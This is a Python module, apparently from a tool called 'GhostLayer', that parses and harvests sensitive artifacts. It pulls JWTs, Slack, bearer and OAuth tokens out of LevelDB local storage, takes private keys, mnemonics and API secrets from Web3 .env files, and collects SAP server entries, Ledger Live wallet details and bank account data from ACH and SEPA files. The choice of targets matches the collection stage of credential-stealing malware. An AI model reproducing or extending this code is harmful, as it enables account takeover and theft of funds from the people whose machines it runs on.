"""
ghost_layer_parsers.py
======================
Deep Parsers & Decoders for High-Leverage Financial & System Artifacts.

Provides structural extraction logic for:
  - NACHA ACH batch files (Field parsing: Routing, Account, Amounts)
  - SEPA / ISO 20022 XML files (IBAN, BIC, Instructed Amounts)
  - LevelDB / Binary Token Extraction (JWTs, OAuth Refresh tokens, Bearer strings)
  - Web3 / DeFi Configs (.env, Foundry, Hardhat private keys)
  - SAP GUI / ERP Configs (saplogon.ini, SAPUILandscape.xml)
  - Electrum & Ledger Live wallet descriptors (xpubs, addresses)
"""

from __future__ import annotations

import json
import logging
import re
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger("GhostLayer.Parsers")

# Regex patterns for binary / LevelDB token scanning
JWT_PATTERN = re.compile(rb'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}')
BEARER_PATTERN = re.compile(rb'Bearer\s+([a-zA-Z0-9_\-\.]{20,})', re.IGNORECASE)
SLACK_TOKEN_PATTERN = re.compile(rb'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9_-]*')
OAUTH_REFRESH_PATTERN = re.compile(rb'(?:refresh_token|access_token)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-\.]{24,})', re.IGNORECASE)
HEX_PRIVATE_KEY_PATTERN = re.compile(r'(?:0x)?[a-fA-F0-9]{64}')


def parse_nacha_ach(content: str) -> Dict[str, Any]:
    """
    Parses a NACHA (National Automated Clearing House Association) 94-character record file.
    Extracts:
      - File Header (Immediate Destination, Immediate Origin)
      - Company Batch Headers (Company Name, Identification, SEC code)
      - Entry Detail Records (Transaction Code, RDFI Routing Number, DF Account Number, Amount, Name)
    """
    lines = [line.strip("\r\n") for line in content.split("\n") if len(line.strip("\r\n")) >= 50]
    parsed: Dict[str, Any] = {
        "file_header": {},
        "batches": [],
        "entries": [],
        "total_amount_cents": 0,
        "entry_count": 0,
    }

    current_batch: Optional[Dict[str, Any]] = None

    for line in lines:
        record_type = line[0]

        if record_type == "1":  # File Header
            parsed["file_header"] = {
                "priority_code": line[1:3].strip(),
                "immediate_destination": line[3:13].strip(),
                "immediate_origin": line[13:23].strip(),
                "creation_date": line[23:29].strip(),
                "creation_time": line[29:33].strip(),
                "immediate_destination_name": line[40:63].strip(),
                "immediate_origin_name": line[63:86].strip(),
            }
        elif record_type == "5":  # Company / Batch Header
            current_batch = {
                "service_class_code": line[1:4].strip(),
                "company_name": line[4:20].strip(),
                "company_id": line[40:50].strip(),
                "sec_code": line[50:53].strip(),
                "entry_description": line[53:63].strip(),
            }
            parsed["batches"].append(current_batch)
        elif record_type == "6":  # Entry Detail Record
            # Format:
            # 0: Record Type (6)
            # 1-3: Transaction Code (e.g. 22 checking credit, 27 checking debit)
            # 3-11: RDFI Routing Transit Number (8 digits)
            # 11-12: Check Digit
            # 12-29: DFI Account Number (17 chars)
            # 29-39: Amount in cents (10 chars)
            # 39-54: Individual Identification Number
            # 54-76: Individual / Receiving Company Name
            try:
                tx_code = line[1:3].strip()
                routing = line[3:11].strip() + line[11:12].strip()
                account = line[12:29].strip()
                amount_str = line[29:39].strip()
                amount_cents = int(amount_str) if amount_str.isdigit() else 0
                name = line[54:76].strip()

                parsed["total_amount_cents"] += amount_cents
                parsed["entry_count"] += 1
                parsed["entries"].append({
                    "tx_code": tx_code,
                    "routing_number": routing,
                    "account_number": account,
                    "amount_cents": amount_cents,
                    "amount_usd": amount_cents / 100.0,
                    "individual_name": name,
                    "batch": current_batch["company_name"] if current_batch else "UNKNOWN",
                })
            except Exception as exc:
                logger.debug("Error parsing NACHA entry line: %s", exc)

    return parsed


def parse_sepa_iso20022(content: str) -> Dict[str, Any]:
    """
    Parses a SEPA ISO 20022 XML message (pain.001 credit transfer, pain.008 direct debit, camt.053).
    Extracts IBANs, BICs, Instructed Amounts, and Debtor/Creditor entities.
    """
    parsed: Dict[str, Any] = {
        "debtors": [],
        "creditors": [],
        "total_amount": 0.0,
        "currencies": set(),
        "transactions": [],
    }
    try:
        # Strip XML namespaces for simplified element access
        xml_clean = re.sub(r'\sxmlns(?::\w+)?="[^"]*"', '', content, count=1)
        root = ET.fromstring(xml_clean)

        for tx in root.findall(".//CdtTrfTxInf") + root.findall(".//DrctDbtTxInf"):
            entry: Dict[str, Any] = {}
            # Amount
            amt_elem = tx.find(".//Amt/InstdAmt")
            if amt_elem is not None:
                entry["amount"] = float(amt_elem.text or 0)
                entry["currency"] = amt_elem.get("Ccy", "EUR")
                parsed["total_amount"] += entry["amount"]
                parsed["currencies"].add(entry["currency"])

            # Creditor
            cdtr_name = tx.find(".//Cdtr/Nm")
            cdtr_iban = tx.find(".//CdtrAcct/Id/IBAN")
            cdtr_bic = tx.find(".//CdtrAgt/FinInstnId/BICFI") or tx.find(".//CdtrAgt/FinInstnId/BIC")
            if cdtr_iban is not None:
                entry["creditor_iban"] = cdtr_iban.text
                entry["creditor_name"] = cdtr_name.text if cdtr_name is not None else ""
                entry["creditor_bic"] = cdtr_bic.text if cdtr_bic is not None else ""
                parsed["creditors"].append(entry["creditor_iban"])

            # Debtor
            dbtr_name = root.find(".//Dbtr/Nm")
            dbtr_iban = root.find(".//DbtrAcct/Id/IBAN")
            if dbtr_iban is not None and dbtr_iban.text not in parsed["debtors"]:
                parsed["debtors"].append(dbtr_iban.text)

            parsed["transactions"].append(entry)

        parsed["currencies"] = list(parsed["currencies"])
    except Exception as exc:
        logger.debug("Failed parsing SEPA ISO20022 XML: %s", exc)

    return parsed


def extract_strings_from_leveldb(file_path: Path, max_bytes: int = 5_000_000) -> Dict[str, List[str]]:
    """
    Extracts security tokens (JWTs, Slack session tokens, OAuth bearer tokens)
    directly from LevelDB .ldb or .log files without external compiled dependencies.
    """
    extracted: Dict[str, List[str]] = {
        "jwts": [],
        "slack_tokens": [],
        "bearer_tokens": [],
        "oauth_tokens": [],
    }
    if not file_path.is_file():
        return extracted

    try:
        data = file_path.read_bytes()[:max_bytes]

        # Extract JWTs
        for match in JWT_PATTERN.finditer(data):
            token = match.group(0).decode("utf-8", errors="ignore")
            if token not in extracted["jwts"]:
                extracted["jwts"].append(token)

        # Extract Slack tokens
        for match in SLACK_TOKEN_PATTERN.finditer(data):
            token = match.group(0).decode("utf-8", errors="ignore")
            if token not in extracted["slack_tokens"]:
                extracted["slack_tokens"].append(token)

        # Extract Bearer tokens
        for match in BEARER_PATTERN.finditer(data):
            token = match.group(1).decode("utf-8", errors="ignore")
            if token not in extracted["bearer_tokens"]:
                extracted["bearer_tokens"].append(token)

        # Extract OAuth refresh tokens
        for match in OAUTH_REFRESH_PATTERN.finditer(data):
            token = match.group(1).decode("utf-8", errors="ignore")
            if token not in extracted["oauth_tokens"]:
                extracted["oauth_tokens"].append(token)

    except Exception as exc:
        logger.debug("LevelDB string extraction failed on %s: %s", file_path, exc)

    return extracted


def parse_web3_env_file(content: str) -> Dict[str, str]:
    """
    Extracts Web3 provider keys, deployer private keys, and API tokens from .env content.
    """
    extracted: Dict[str, str] = {}
    for line in content.split("\n"):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "=" in line:
            key, val = line.split("=", 1)
            key = key.strip()
            val = val.strip().strip('"').strip("'")
            if any(k in key.upper() for k in (
                "PRIVATE_KEY", "SECRET", "INFURA", "ALCHEMY", "ETHERSCAN", "ANKR", "MNEMONIC", "SEED"
            )):
                extracted[key] = val
    return extracted


def parse_sap_gui_config(content: str) -> List[Dict[str, Any]]:
    """
    Parses saplogon.ini or SAPUILandscape.xml connection descriptors.
    """
    servers: List[Dict[str, Any]] = []
    # Simple regex parse for saplogon.ini [Server] or Item entries
    item_pattern = re.compile(r'Item\d+=(.*?)(?:\r?\n|$)', re.IGNORECASE)
    server_pattern = re.compile(r'(?:Server|SystemID|MSSrvName)\s*=\s*(.*?)(?:\r?\n|$)', re.IGNORECASE)

    for match in item_pattern.finditer(content):
        servers.append({"entry": match.group(1).strip()})
    for match in server_pattern.finditer(content):
        servers.append({"system": match.group(1).strip()})

    # Try XML landscape format
    if "<Landscape" in content:
        try:
            root = ET.fromstring(content)
            for s in root.findall(".//Service"):
                servers.append({
                    "name": s.get("name"),
                    "systemid": s.get("systemid"),
                    "server": s.get("server"),
                    "router": s.get("router"),
                })
        except Exception:
            pass

    return servers


def parse_ledger_live_descriptors(content: str) -> List[Dict[str, Any]]:
    """
    Parses Ledger Live app.json or accounts.json to extract account labels,
    currencies, and xpubs.
    """
    accounts: List[Dict[str, Any]] = []
    try:
        data = json.loads(content)
        # Handle accounts array or nested data.accounts
        raw_accounts = data.get("data", {}).get("accounts", []) or data.get("accounts", [])
        for acc in raw_accounts:
            if isinstance(acc, dict):
                accounts.append({
                    "name": acc.get("name"),
                    "currency": acc.get("currencyId") or acc.get("currency"),
                    "xpub": acc.get("xpub"),
                    "freshAddress": acc.get("freshAddress"),
                    "balance": acc.get("balance"),
                })
    except Exception as exc:
        logger.debug("Failed parsing Ledger Live json: %s", exc)
    return accounts
